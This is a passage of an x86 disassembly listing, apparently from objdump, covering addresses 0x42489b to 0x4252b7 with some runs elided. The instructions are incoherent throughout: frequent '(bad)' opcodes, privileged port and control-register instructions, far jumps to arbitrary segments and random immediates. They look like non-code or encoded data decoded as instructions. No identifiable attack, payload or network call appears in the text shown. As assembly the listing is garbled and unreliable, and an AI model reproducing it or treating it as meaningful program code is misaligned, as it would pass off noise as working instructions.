  42489b:	xchg   esp,eax
  42489c:	pop    ss
  42489d:	(bad)  
  42489f:	xchg   esi,eax
  4248a0:	lahf   
  4248a1:	sbb    eax,0xa0aee032
  4248a6:	out    0x11,al
  4248a8:	dec    edi
  4248a9:	sbb    bl,BYTE PTR [ecx-0x3c]
  4248ac:	(bad)  
  4248ad:	push   eax
  4248ae:	inc    ebp
  4248af:	jmp    0xe091:0x4616c60a
  4248b6:	test   eax,0x37dc69f
  4248bb:	into   
  4248bc:	jae    0x424932
  4248be:	rol    DWORD PTR [ebx-0x64],1
  4248c1:	int3   
  4248c2:	mov    dh,0x81
  4248c4:	push   edi
  4248c5:	dec    esi
  4248c6:	imul   edi,DWORD PTR [eax-0x9],0xfffffff5
  4248ca:	xchg   DWORD PTR [ecx*4+0x45a10b3a],ecx
  4248d1:	(bad)  
  4248d2:	in     al,dx
  4248d3:	das    
  4248d4:	arpl   si,ax
  4248d6:	cmp    esp,ebp
  4248d8:	mov    edx,0x78a608c2
  4248dd:	push   eax
  4248de:	jnp    0x4248db
  4248e0:	dec    ecx
  4248e1:	loopne 0x42486d
  4248e3:	pop    ds
  4248e4:	jae    0x4248a1
  4248e6:	inc    ebx
  4248e7:	add    edx,DWORD PTR [ebx-0x70]
  4248ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4248eb:	add    al,0xa8
  4248ed:	xchg   esi,eax
  4248ee:	in     al,0x4c
  4248f0:	out    dx,eax
  4248f1:	or     eax,0xff46d616
  4248f6:	hlt    
  4248f7:	jns    0x4248ec
  4248f9:	test   BYTE PTR [ecx],ah
  4248fb:	frstor [esi-0xfb78c7c]
  424901:	mov    WORD PTR [ebx+0x6e214504],fs
  424907:	xor    al,0x74
  424909:	inc    esi
  42490a:	mov    bh,0xab
  42490c:	or     DWORD PTR [esi],ecx
  42490e:	pop    ds
  42490f:	add    ah,ch
  424911:	pop    ecx
  424912:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424913:	js     0x424900
  424915:	pushf  
  424916:	or     al,0xc5
  424918:	(bad)  
  424919:	sbb    bh,BYTE PTR [eax-0x564ad97]
  42491f:	mov    ecx,0x62899aca
  424924:	inc    edx
  424925:	in     eax,0x11
  424927:	(bad)  
  424928:	je     0x424989
  42492a:	dec    eax
  42492b:	and    BYTE PTR ds:0x58db96b0,ah
  424931:	inc    esi
  424932:	jmp    0x4248d4
  424934:	dec    edi
	...
  424995:	add    BYTE PTR [ebx+0x18],ch
  424998:	arpl   WORD PTR [edx+0x73],bp
  42499b:	jnp    0x424a08
  42499d:	sbb    ebp,eax
  42499f:	adc    eax,0x706fbac2
  4249a4:	xchg   ebx,eax
  4249a5:	ror    bl,cl
  4249a7:	test   DWORD PTR [ecx],eax
  4249a9:	add    BYTE PTR [edi],al
  4249ab:	add    DWORD PTR [eax],eax
  4249ad:	add    bl,bl
  4249af:	push   esi
  4249b0:	or     edx,DWORD PTR [edi-0x6822eb0d]
  4249b6:	adc    DWORD PTR [ecx+0x75],esi
  4249b9:	mov    ds:0x7e6c1b2e,eax
  4249be:	mov    DWORD PTR [edx+0x33],eax
  4249c1:	cld    
  4249c2:	or     al,0x65
  4249c4:	cmp    BYTE PTR [ecx+0x47],ch
  4249c7:	push   esp
  4249c8:	outs   dx,BYTE PTR ds:[esi]
  4249c9:	cwde   
  4249ca:	xchg   ebp,eax
  4249cb:	adc    esp,esp
  4249cd:	pop    edi
  4249ce:	lds    ebx,FWORD PTR [eax]
  4249d0:	in     al,0x96
  4249d2:	fnstenv [eax+ecx*1]
  4249d5:	hlt    
  4249d6:	pop    ecx
  4249d7:	test   DWORD PTR [ebp+0x666eb358],ebx
  4249dd:	xchg   ecx,eax
  4249de:	and    BYTE PTR [ebp+edi*1+0x7a732261],0xe8
  4249e6:	stos   DWORD PTR es:[edi],eax
  4249e7:	aaa    
  4249e8:	xor    BYTE PTR [ebx+ebp*2],dh
  4249eb:	and    cx,WORD PTR [eax+ebx*1+0x26a85b1c]
  4249f3:	pushw  0xffb6
  4249f6:	xchg   edi,eax
  4249f7:	ret    
  4249f8:	dec    ebx
  4249f9:	adc    DWORD PTR [ecx-0x71f82e8e],ecx
  4249ff:	daa    
  424a00:	(bad)  
  424a01:	dec    ecx
  424a02:	sub    ebx,ebx
  424a04:	dec    edi
  424a05:	test   al,0x62
  424a07:	adc    eax,0x50e2edcb
  424a0c:	lods   eax,DWORD PTR ds:[esi]
  424a0d:	and    edx,DWORD PTR [esi-0x30]
  424a10:	mov    edi,0xb7f6a69b
  424a15:	sub    DWORD PTR [edi+0x6d069c06],eax
  424a1b:	loop   0x424a2e
  424a1d:	leave  
  424a1e:	jecxz  0x424a0a
  424a20:	retf   0xcbd2
  424a23:	and    al,0xd5
  424a25:	push   esi
  424a26:	inc    ecx
  424a27:	(bad)  
  424a28:	and    BYTE PTR [ebp-0x4a],bh
  424a2b:	cmp    bh,BYTE PTR [esi+ecx*4]
  424a2e:	cmp    al,0xad
  424a30:	jo     0x424a9b
  424a32:	mov    dl,0xba
  424a34:	das    
  424a35:	pop    ebp
  424a36:	lahf   
  424a37:	mov    esi,eax
  424a39:	aas    
  424a3a:	pop    esi
  424a3b:	lods   eax,DWORD PTR ds:[esi]
  424a3c:	cmc    
  424a3d:	mov    esp,0xb8e10282
  424a42:	rcl    ah,cl
  424a44:	cmp    ecx,esi
  424a46:	xchg   DWORD PTR [ebx],esi
  424a48:	les    eax,FWORD PTR [edi-0x2c57701b]
  424a4e:	jg     0x424a8d
  424a50:	push   0x15949a82
  424a55:	jae    0x4249dc
  424a57:	sbb    eax,0xd4ff17de
  424a5c:	or     eax,0x7daa1bfa
  424a61:	and    DWORD PTR [edx],edx
  424a63:	cld    
  424a64:	sar    BYTE PTR [ebx-0x12],1
  424a67:	pop    esi
  424a68:	push   ebp
  424a69:	int3   
  424a6a:	bound  ebx,QWORD PTR [ebx]
  424a6c:	push   ss
  424a6d:	scas   al,BYTE PTR es:[edi]
  424a6e:	mov    ecx,0x188e090b
  424a73:	sbb    dl,al
  424a75:	jge    0x424a10
  424a77:	sub    BYTE PTR [ecx-0x19],bh
  424a7a:	or     DWORD PTR ds:0xe83d644d,edi
  424a80:	and    eax,0xc28907dc
  424a85:	xor    dh,BYTE PTR [ebp+0x7e826298]
  424a8b:	bound  ebp,QWORD PTR [esi-0x3b]
  424a8e:	mov    eax,ds:0x919a51c8
  424a93:	sar    BYTE PTR [eax-0x4b],0x74
  424a97:	inc    ecx
  424a98:	and    al,dl
  424a9a:	out    0xcc,eax
  424a9c:	mov    BYTE PTR [edx],bh
  424a9e:	add    al,0x84
  424aa0:	dec    ecx
  424aa1:	fisttp WORD PTR [eax+eiz*1-0x5c]
  424aa5:	cs in  al,0x50
  424aa8:	push   es
  424aa9:	mov    ch,0x4a
  424aab:	lock stos DWORD PTR es:[edi],eax
  424aad:	jmp    0x424a66
  424aaf:	aad    0x44
  424ab1:	push   ds
  424ab2:	push   ds
  424ab3:	and    BYTE PTR [eax+0x0],0x0
	...
  424b16:	push   es
  424b17:	aas    
  424b18:	or     eax,0xb6bb3db9
  424b1d:	mov    edi,0x1cbed53b
  424b22:	lock sub al,0x41
  424b25:	adc    edx,edx
  424b27:	xchg   BYTE PTR [ecx],al
  424b29:	add    BYTE PTR [edi],al
  424b2b:	add    DWORD PTR [eax],eax
  424b2d:	add    BYTE PTR [edi],bh
  424b2f:	cwde   
  424b30:	iret   
  424b31:	adc    bh,BYTE PTR [bx+si]
  424b34:	pop    esp
  424b35:	xor    eax,DWORD PTR [esi]
  424b37:	add    bl,cl
  424b39:	lods   al,BYTE PTR ds:[esi]
  424b3a:	fsubr  QWORD PTR [ebp+0xf334f77]
  424b40:	std    
  424b41:	xchg   ecx,eax
  424b42:	mov    esp,0x1470f62d
  424b47:	aas    
  424b48:	call   0x4e0ae9cb
  424b4d:	xlat   BYTE PTR ds:[ebx]
  424b4e:	aas    
  424b4f:	mov    ds:0xa3899464,eax
  424b54:	lahf   
  424b55:	ds lss esi,FWORD PTR ds:[ebx]
  424b5a:	popa   
  424b5b:	(bad)  
  424b5c:	addr16 xor eax,0xff6cb88a
  424b62:	jno    0x424b64
  424b64:	jnp    0x424bc3
  424b66:	sbb    eax,0xe877e6bf
  424b6b:	bound  ecx,QWORD PTR [eax]
  424b6d:	add    cl,BYTE PTR ds:0x87f9b85b
  424b73:	retf   
  424b74:	dec    esi
  424b75:	sub    DWORD PTR [eax-0x2d],edx
  424b78:	mov    ecx,0xfdafa112
  424b7d:	or     BYTE PTR [ebx],cl
  424b7f:	in     eax,0xe1
  424b81:	ins    DWORD PTR es:[edi],dx
  424b82:	lock mov cl,0x6d
  424b85:	pop    esi
  424b86:	inc    ebp
  424b87:	out    dx,eax
  424b88:	cld    
  424b89:	xor    dl,ch
  424b8b:	dec    eax
  424b8c:	js     0x424c00
  424b8e:	stos   DWORD PTR es:[edi],eax
  424b8f:	mov    WORD PTR [edx-0x5f],ds
  424b92:	out    0x38,eax
  424b94:	or     bh,BYTE PTR [edx+0x312b1328]
  424b9a:	fs mov ebx,0xe8e61a14
  424ba0:	or     eax,0xd50a2510
  424ba5:	data16 mov dl,BYTE PTR [ecx-0x5076d2a8]
  424bac:	adc    ebx,ebp
  424bae:	inc    ecx
  424baf:	mov    eax,ds:0xc1596a74
  424bb4:	fbld   TBYTE PTR [ebp+0x5d5d5d37]
  424bba:	sbb    BYTE PTR [ebp-0x3c],0x7f
  424bbe:	cmp    BYTE PTR [ebx],al
  424bc0:	sub    ebx,DWORD PTR [eax+0x62]
  424bc3:	clc    
  424bc4:	popa   
  424bc5:	jg     0x424b7b
  424bc7:	dec    esi
  424bc8:	js     0x424b88
  424bca:	(bad)  
  424bcb:	out    dx,eax
  424bcc:	mov    ebp,0x80a689e
  424bd1:	enter  0xb172,0x7b
  424bd5:	lods   eax,DWORD PTR ds:[esi]
  424bd6:	not    ch
  424bd8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424bd9:	inc    ebx
  424bda:	(bad)  
  424bdb:	out    dx,eax
  424bdc:	xchg   bh,ch
  424bde:	or     al,0xe
  424be0:	popf   
  424be1:	rcl    DWORD PTR [esi],cl
  424be3:	cmp    ebp,DWORD PTR [edx+0x178b617e]
  424be9:	jae    0x424bde
  424beb:	jecxz  0x424bcf
  424bed:	test   BYTE PTR [bp-0x21fc],0x7c
  424bf3:	pop    ebx
  424bf4:	fcom   DWORD PTR [ebp-0x1b1cd463]
  424bfa:	cmp    eax,0xda7d1415
  424bff:	(bad)  
  424c00:	in     al,0x66
  424c02:	lock sub ah,ch
  424c05:	xchg   BYTE PTR cs:[ecx+edx*4+0x34],dl
  424c0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424c0b:	add    BYTE PTR [edx+0x4df2d39e],0x88
  424c12:	fsub   QWORD PTR [esp+ebp*1]
  424c15:	mov    al,BYTE PTR [edi]
  424c17:	xor    BYTE PTR [edi+0x30],bh
  424c1a:	pop    es
  424c1b:	sbb    eax,0x8370632f
  424c20:	fimul  DWORD PTR [esi-0x69]
  424c23:	in     al,dx
  424c24:	adc    al,BYTE PTR [esi]
  424c26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424c27:	shr    esi,1
  424c29:	mov    ebp,0xebdeeeaa
  424c2e:	mov    DWORD PTR [esi+0x9],edx
  424c31:	out    0x6f,eax
  424c33:	leave  
  424c34:	std    
	...
  424c95:	add    BYTE PTR [edx+ebx*8-0x4c],ch
  424c99:	push   0xffffffb6
  424c9b:	outs   dx,BYTE PTR ds:[esi]
  424c9c:	(bad)  
  424c9d:	fisubr WORD PTR ds:0x7c588c09
  424ca3:	jno    0x424cd2
  424ca5:	icebp  
  424ca6:	fld    DWORD PTR [edi+0x1070001]
  424cac:	add    BYTE PTR [eax],al
  424cae:	xchg   esi,eax
  424caf:	(bad)  
  424cb0:	arpl   ax,bp
  424cb2:	mov    es,eax
  424cb4:	fimul  WORD PTR [esp+eax*4]
  424cb7:	jno    0x424ca4
  424cb9:	xchg   ebx,eax
  424cba:	dec    esi
  424cbb:	xchg   ecx,eax
  424cbc:	or     bh,BYTE PTR [esp+eiz*2+0x1c]
  424cc0:	xor    edx,ebp
  424cc2:	addr16 mov ebx,0xfe02d3f2
  424cc8:	sbb    DWORD PTR [edi-0x1d],ecx
  424ccb:	in     eax,0xcb
  424ccd:	inc    ebp
  424cce:	into   
  424ccf:	dec    edx
  424cd0:	adc    BYTE PTR [ebx],bl
  424cd2:	pop    ecx
  424cd3:	fsub   st,st(7)
  424cd5:	mov    edx,0xfb2eb71f
  424cda:	es iret 
  424cdc:	aad    0x6a
  424cde:	outs   dx,BYTE PTR ds:[esi]
  424cdf:	ret    0xafb8
  424ce2:	cdq    
  424ce3:	popf   
  424ce4:	mov    ah,0x3b
  424ce6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424ce7:	xchg   edx,eax
  424ce8:	push   ecx
  424ce9:	cmpps  xmm1,xmm6,0x76
  424ced:	jbe    0x424ca0
  424cef:	push   ss
  424cf0:	bound  eax,QWORD PTR [ebx]
  424cf2:	cli    
  424cf3:	xor    DWORD PTR [ebp+0x53],0x98699bcc
  424cfa:	xor    ecx,edx
  424cfc:	xchg   DWORD PTR [esi-0xd1a0771],edi
  424d02:	sbb    BYTE PTR [ecx-0x74],0x63
  424d06:	outs   dx,BYTE PTR ds:[esi]
  424d07:	test   eax,0xe256834e
  424d0c:	pop    ds
  424d0d:	call   0x1b19:0xdf5f1467
  424d14:	outs   dx,DWORD PTR ds:[esi]
  424d15:	sbb    DWORD PTR [ecx+ecx*1-0x33],ebp
  424d19:	sub    bh,BYTE PTR [esi]
  424d1b:	out    dx,eax
  424d1c:	adc    bh,BYTE PTR [ecx]
  424d1e:	xchg   edx,eax
  424d1f:	cmp    esi,DWORD PTR [esi]
  424d21:	loopne 0x424d03
  424d23:	sub    cl,BYTE PTR [edx+0x9]
  424d26:	aas    
  424d27:	ins    DWORD PTR es:[edi],dx
  424d28:	fisttp DWORD PTR [ecx-0x3411310a]
  424d2e:	dec    ecx
  424d2f:	sub    ah,BYTE PTR [esi+ebx*2+0x1f]
  424d33:	outs   dx,DWORD PTR ds:[esi]
  424d34:	aaa    
  424d35:	call   0x7159:0x8886519f
  424d3c:	fisubr DWORD PTR [ecx+0x24461b4d]
  424d42:	mov    ebp,0xea6df884
  424d47:	push   esi
  424d48:	pushf  
  424d49:	and    eax,0xdb7c7c33
  424d4e:	xchg   edi,eax
  424d4f:	out    0xe4,al
  424d51:	cs addr16 lahf 
  424d54:	cwde   
  424d55:	mov    ch,0xf0
  424d58:	pushf  
  424d59:	add    eax,0x3c0b1ba3
  424d5e:	pop    es
  424d5f:	cmp    al,BYTE PTR [eax+0x60]
  424d62:	jb     0x424dd5
  424d64:	xchg   ebp,eax
  424d65:	add    al,0xc9
  424d67:	and    BYTE PTR [ecx],ch
  424d69:	mov    dl,0x4e
  424d6b:	jle    0x424dc3
  424d6d:	pop    ebx
  424d6e:	ss (bad) 
  424d70:	jmp    0x424d0b
  424d72:	and    eax,0xbf6489a5
  424d77:	mov    dh,0x2d
  424d79:	cli    
  424d7a:	sub    eax,0x575912b5
  424d7f:	cmp    al,0x4a
  424d81:	test   al,0xb8
  424d83:	inc    edi
  424d84:	mov    ah,0x12
  424d86:	out    dx,eax
  424d87:	in     al,dx
  424d88:	adc    al,dh
  424d8a:	mov    DWORD PTR [ecx+0x7c],0xde237a95
  424d91:	jge    0x424d2a
  424d93:	leave  
  424d94:	loopne 0x424dcf
  424d96:	sub    bh,BYTE PTR [edx]
  424d98:	repnz outs dx,BYTE PTR ds:[esi]
  424d9a:	ins    BYTE PTR es:[edi],dx
  424d9b:	in     al,0xbb
  424d9d:	cmp    al,0x21
  424d9f:	cmc    
  424da0:	dec    edi
  424da1:	mov    ecx,0xc4a1f564
  424da6:	add    cl,BYTE PTR [esi]
  424da8:	fld    DWORD PTR [eax-0x1a]
  424dab:	sbb    eax,0x96fb592
  424db0:	jg     0x424dd6
  424db2:	(bad)  
  424db3:	cmp    DWORD PTR [edx],edx
	...
  424e15:	add    BYTE PTR ds:0xf361d20c,bh
  424e1b:	(bad)  
  424e1c:	mov    edi,0xb8b3635c
  424e21:	xchg   edi,ecx
  424e23:	mov    dh,0x78
  424e25:	mov    al,0xe0
  424e27:	mov    BYTE PTR [ecx],al
  424e29:	add    BYTE PTR [edi],al
  424e2b:	add    DWORD PTR [eax],eax
  424e2d:	add    BYTE PTR [eax+ecx*2],al
  424e30:	sub    eax,0xa191517c
  424e35:	jne    0x424e1e
  424e37:	sahf   
  424e38:	add    DWORD PTR [edx+eax*2+0x53bfd259],0x572d859
  424e43:	sub    al,0x58
  424e45:	mov    ch,0xf2
  424e47:	out    dx,eax
  424e48:	setg   BYTE PTR [ebx+esi*1+0x2]
  424e4d:	stos   DWORD PTR es:[edi],eax
  424e4e:	ins    BYTE PTR es:[edi],dx
  424e4f:	in     al,dx
  424e50:	jno    0x424e7f
  424e52:	mov    ah,0xca
  424e54:	mov    al,0xab
  424e56:	and    DWORD PTR [ebp+0x116debe6],0xffffffb9
  424e5d:	scas   al,BYTE PTR es:[edi]
  424e5e:	ret    0xb257
  424e61:	add    cl,ch
  424e63:	cmp    eax,0xe7e3d655
  424e68:	shr    DWORD PTR [esi+0x52],cl
  424e6b:	push   esp
  424e6c:	pop    esp
  424e6d:	pop    ecx
  424e6e:	dec    ecx
  424e6f:	or     dh,BYTE PTR ds:0x7f10508d
  424e75:	sub    eax,0xcb02fc16
  424e7a:	xchg   esp,eax
  424e7b:	sub    eax,0xb3d04176
  424e80:	fstp   QWORD PTR [edi]
  424e82:	cmp    al,0xa0
  424e84:	hlt    
  424e85:	push   ecx
  424e86:	mov    edx,0xf33abcdb
  424e8b:	xor    DWORD PTR [ebp-0x226ccef],ebx
  424e91:	retf   0x8d44
  424e94:	push   ds
  424e95:	cmp    BYTE PTR ds:0x496f4134,dl
  424e9b:	cmp    bl,BYTE PTR ds:0x4d57b832
  424ea1:	ror    BYTE PTR [edi],0xa5
  424ea4:	xor    BYTE PTR [edx],0x79
  424ea7:	sar    edi,cl
  424ea9:	pop    ds
  424eaa:	jg     0x424e32
  424eac:	push   ebx
  424ead:	rcl    bl,1
  424eaf:	add    DWORD PTR [esi+0x29cf75c5],esi
  424eb5:	jae    0x424ee8
  424eb7:	fcmovnbe st,st(4)
  424eb9:	sub    eax,DWORD PTR [ebp+0x7da4d065]
  424ebf:	in     al,dx
  424ec0:	lea    edx,[esi+0x6d5fa9d6]
  424ec6:	ins    BYTE PTR es:[edi],dx
  424ec7:	mov    eax,0x7864c274
  424ecc:	dec    edx
  424ecd:	mov    DWORD PTR [ebp+0x2fddc189],eax
  424ed3:	cmp    BYTE PTR [edi+0x15a357c0],dl
  424ed9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424eda:	jecxz  0x424f56
  424edc:	push   ecx
  424edd:	jno    0x424e93
  424edf:	adc    eax,DWORD PTR [ecx+0x1913e1c6]
  424ee5:	mov    cl,0x38
  424ee7:	std    
  424ee8:	scas   al,BYTE PTR es:[edi]
  424ee9:	xor    ah,ch
  424eeb:	cmp    bh,BYTE PTR ds:0xa565a86c
  424ef1:	sbb    DWORD PTR [edi-0x6edacd2e],esp
  424ef7:	loopne 0x424eec
  424ef9:	and    ch,0xc6
  424efc:	fisubr WORD PTR [esi+eiz*1]
  424eff:	nop
  424f00:	mov    ebx,0x258ab876
  424f05:	xchg   eax,esi
  424f07:	aaa    
  424f08:	mov    cr1,edx
  424f0b:	dec    ebp
  424f0c:	jmp    0xcd78:0x46db163b
  424f13:	adc    eax,0xe448d039
  424f18:	(bad)  
  424f19:	xor    ebp,DWORD PTR [edi+0x1c]
  424f1c:	(bad)  
  424f1d:	data16 ja 0x424f7b
  424f20:	jae    0x424eb1
  424f22:	scas   eax,DWORD PTR es:[edi]
  424f23:	int3   
  424f24:	ret    
  424f25:	repnz mov edx,0x39e75a7a
  424f2b:	inc    edi
  424f2c:	ret    0x7403
  424f2f:	leave  
  424f30:	xor    BYTE PTR [ebx],bh
  424f32:	cmp    BYTE PTR [edx],dh
  424f34:	add    BYTE PTR cs:[eax],al
	...
  424f93:	add    BYTE PTR [eax],al
  424f95:	add    BYTE PTR [ebx+0x16],cl
  424f98:	int    0x41
  424f9a:	fstp   st(3)
  424f9c:	iret   
  424f9d:	push   ds
  424f9e:	xor    al,0x88
  424fa0:	ror    BYTE PTR [eax-0x4292bb82],1
  424fa6:	out    0x89,eax
  424fa8:	add    DWORD PTR [eax],eax
  424faa:	pop    es
  424fab:	add    DWORD PTR [eax],eax
  424fad:	add    ch,ch
  424faf:	fldcw  WORD PTR [edx-0x77]
  424fb2:	inc    ebx
  424fb3:	mov    edi,0x365fae86
  424fb8:	pop    ds
  424fb9:	cmc    
  424fba:	push   ebx
  424fbb:	sbb    eax,0x3c91a34d
  424fc0:	add    DWORD PTR [edx+0x4341cdc8],esi
  424fc6:	gs xchg edi,eax
  424fc8:	mov    edi,0xb4f03d0a
  424fcd:	or     ch,BYTE PTR [edx]
  424fcf:	scas   eax,DWORD PTR es:[edi]
  424fd0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424fd1:	push   0x68
  424fd3:	sub    cl,BYTE PTR [esp+eax*8]
  424fd6:	dec    ecx
  424fd7:	xchg   esi,eax
  424fd8:	repz sub ecx,esp
  424fdb:	cmp    ebp,DWORD PTR [ecx]
  424fdd:	mov    bl,0xae
  424fdf:	push   edi
  424fe0:	ins    DWORD PTR es:[edi],dx
  424fe1:	sbb    eax,0x97c624f4
  424fe6:	bound  edi,QWORD PTR [esi+eax*2]
  424fe9:	mov    BYTE PTR [ecx+0x5b],dh
  424fec:	add    al,0xfd
  424fee:	inc    esp
  424fef:	stos   DWORD PTR es:[edi],eax
  424ff0:	push   esp
  424ff1:	push   ebp
  424ff2:	(bad)  
  424ff3:	enter  0x5f79,0x9d
  424ff7:	stc    
  424ff8:	repnz mov edi,0x68a77128
  424ffe:	xor    al,0xa1
  425000:	mov    al,0xfb
  425002:	adc    esi,edx
  425004:	push   ebp
  425005:	adc    ebx,DWORD PTR [edi]
  425007:	test   BYTE PTR [bp+di],ch
  42500a:	or     eax,0x6e87c3ab
  42500f:	xchg   edi,eax
  425010:	or     esi,DWORD PTR ds:0x8366b1cf
  425016:	xor    edx,eax
  425018:	rol    DWORD PTR [edi-0x63],cl
  42501b:	fs push ebp
  42501d:	mov    DWORD PTR [bx+di],edi
  425020:	sub    DWORD PTR ds:0xe32f0f20,ecx
  425026:	shl    DWORD PTR [edx+0x343a652c],1
  42502c:	out    dx,eax
  42502d:	scas   eax,DWORD PTR es:[edi]
  42502e:	jmp    DWORD PTR [edi+0x2bd2cda6]
  425034:	sbb    eax,0x85599595
  425039:	and    edx,ebp
  42503b:	in     al,0x22
  42503d:	test   BYTE PTR [ebp-0xb],al
  425040:	repnz inc esp
  425042:	(bad)  
  425043:	shl    DWORD PTR [esi-0x6e],cl
  425046:	xchg   DWORD PTR ds:0x4e06eb08,esp
  42504c:	or     esi,edi
  42504e:	lea    ecx,[ecx-0x1e90edac]
  425054:	and    ebx,DWORD PTR [ebx+0x7e8a35cd]
  42505a:	cld    
  42505b:	add    eax,0x14495e45
  425060:	addr16 inc ecx
  425062:	rcr    DWORD PTR [eax+eax*8],0xb6
  425066:	cmp    dl,BYTE PTR [edi-0xc]
  425069:	mov    BYTE PTR [esi],bh
  42506b:	fnsave [eax+0x4f949f05]
  425071:	mov    ecx,0x617eed3d
  425076:	test   eax,0x284bf46d
  42507b:	(bad)  
  42507c:	xchg   esi,eax
  42507d:	dec    edi
  42507e:	loope  0x4250db
  425080:	in     al,0xb4
  425082:	fucom  st(2)
  425084:	push   cs
  425085:	xchg   edx,eax
  425086:	lods   eax,DWORD PTR ds:[esi]
  425087:	aad    0x6b
  425089:	jno    0x4250a1
  42508b:	mov    ecx,0x8fc1641c
  425090:	mul    bl
  425092:	xchg   ebp,eax
  425093:	sub    eax,DWORD PTR ds:0xe7b26e60
  425099:	adc    BYTE PTR [esi-0x1c22da63],0x15
  4250a0:	int    0xb7
  4250a2:	cwde   
  4250a3:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  4250a5:	xchg   ecx,eax
  4250a6:	jge    0x4250bd
  4250a8:	mov    fs,WORD PTR [ecx-0x50]
  4250ab:	or     DWORD PTR [eax-0x2d],0x79
  4250af:	mov    dh,0xdc
  4250b1:	xor    ecx,eax
  4250b3:	mov    ecx,0xfc
	...
  425114:	add    BYTE PTR [eax],al
  425116:	ficom  WORD PTR [ecx]
  425118:	lahf   
  425119:	and    ebx,edi
  42511b:	scas   eax,DWORD PTR es:[edi]
  42511c:	(bad)  
  42511d:	std    
  42511e:	and    al,0x47
  425120:	xchg   edi,eax
  425121:	rcl    BYTE PTR [edx-0x11ff5a42],cl
  425127:	mov    al,BYTE PTR [ecx]
  425129:	add    BYTE PTR [edi],al
  42512b:	add    DWORD PTR [eax],eax
  42512d:	add    dh,dl
  42512f:	sub    al,0xaa
  425131:	xor    DWORD PTR [ebx+0x16232c3b],0xb5a01b8e
  42513b:	jmp    0x6004f3ad
  425140:	mov    fs,WORD PTR [edx+0x1e6d403d]
  425146:	push   edi
  425147:	and    BYTE PTR [ecx+0x6da9331b],ch
  42514d:	mov    BYTE PTR [ecx-0x54],dl
  425150:	jle    0x4250ff
  425152:	xchg   edi,eax
  425153:	sbb    bl,BYTE PTR [edi-0x1dd4a267]
  425159:	and    al,0x6c
  42515b:	mov    ah,0xbc
  42515d:	out    dx,eax
  42515e:	adc    ah,BYTE PTR [ecx-0x65]
  425161:	stc    
  425162:	in     eax,dx
  425163:	out    dx,eax
  425164:	cmc    
  425165:	push   esp
  425166:	mov    bl,0xb1
  425168:	call   edx
  42516a:	pop    es
  42516b:	xchg   ebx,eax
  42516c:	inc    eax
  42516d:	dec    DWORD PTR [edx]
  42516f:	mov    ds:0xa9deae35,al
  425174:	add    DWORD PTR [ebp+0x51],ebx
  425177:	or     eax,0x736dd205
  42517c:	mul    DWORD PTR [edi-0x7cd960d8]
  425182:	pop    edx
  425183:	loop   0x425182
  425185:	sahf   
  425186:	inc    ebp
  425187:	(bad)  
  425188:	push   edi
  425189:	std    
  42518a:	ins    DWORD PTR es:[edi],dx
  42518b:	jge    0x42518c
  42518d:	fisttp WORD PTR [edx+edx*8]
  425190:	jle    0x4251f3
  425192:	pusha  
  425193:	and    esp,ecx
  425195:	cmc    
  425196:	jecxz  0x42519d
  425198:	mov    eax,0x3c2ee2e8
  42519d:	in     eax,dx
  42519e:	and    eax,0xe4fd1a3d
  4251a3:	xchg   esp,eax
  4251a4:	pop    ds
  4251a5:	mov    DWORD PTR [edi+0x7f],edx
  4251a8:	imul   esi,esp,0x58
  4251ab:	cld    
  4251ac:	test   al,0xef
  4251ae:	push   esi
  4251af:	mov    eax,ds:0x7976e52e
  4251b4:	aaa    
  4251b5:	push   ecx
  4251b6:	iret   
  4251b7:	mov    edi,0x4e0a8478
  4251bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4251bd:	aad    0xf0
  4251bf:	lods   al,BYTE PTR ds:[esi]
  4251c0:	mov    dl,0x6b
  4251c2:	and    DWORD PTR [edx],ebx
  4251c4:	daa    
  4251c5:	int3   
  4251c6:	fadd   DWORD PTR [edi]
  4251c8:	push   esi
  4251c9:	mov    DWORD PTR [ecx-0x3d],ecx
  4251cc:	adc    esi,DWORD PTR [edi]
  4251ce:	push   edi
  4251cf:	xchg   ebp,eax
  4251d0:	mov    bh,0x99
  4251d2:	push   ds
  4251d3:	std    
  4251d4:	or     DWORD PTR [esi-0x37feb72f],edi
  4251da:	fdivr  st,st(7)
  4251dc:	bound  ecx,QWORD PTR [eax+0x89d1a32]
  4251e2:	sbb    bl,ah
  4251e4:	inc    edx
  4251e5:	add    dl,cl
  4251e7:	inc    DWORD PTR [edx]
  4251e9:	or     DWORD PTR [ecx+0x41],ebx
  4251ec:	add    esi,esp
  4251ee:	adc    DWORD PTR [edi+0x69],edx
  4251f1:	aas    
  4251f2:	adc    edx,DWORD PTR [edx+0x7]
  4251f5:	xchg   ebx,eax
  4251f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4251f7:	(bad)  
  4251f9:	ror    DWORD PTR [eax+0x6947bed9],0xa6
  425200:	mov    ebp,0xf5945f9c
  425205:	add    BYTE PTR [edx+0x77f8fb84],0x2e
  42520c:	adc    edi,edx
  42520e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42520f:	mov    eax,0x9a752dd8
  425214:	int    0x59
  425216:	bound  eax,QWORD PTR [ecx-0x4b]
  425219:	stc    
  42521a:	fs stos DWORD PTR es:[edi],eax
  42521c:	cmp    DWORD PTR [esi+0x14e34357],ecx
  425222:	loope  0x425204
  425224:	mov    edi,0x6bd6f7db
  425229:	loop   0x425283
  42522b:	imul   eax,DWORD PTR [ebx+0x54],0x21ded34a
  425232:	mov    fs,ebp
  425234:	cmp    DWORD PTR [eax],eax
	...
  425296:	lods   al,BYTE PTR ds:[esi]
  425297:	les    esi,FWORD PTR [ebx-0x32]
  42529a:	jnp    0x42529b
  42529c:	mov    ebp,0x2e2083e6
  4252a1:	add    eax,0xfc142ab
  4252a6:	cmc    
  4252a7:	mov    eax,DWORD PTR [ecx]
  4252a9:	add    BYTE PTR [edi],al
  4252ab:	add    DWORD PTR [eax],eax
  4252ad:	add    BYTE PTR [ecx+0x36],bl
  4252b0:	stos   DWORD PTR es:[edi],eax
  4252b1:	cmp    eax,0xb8451c0
  4252b6:	in     al,dx
  4252b7:	(bad)  
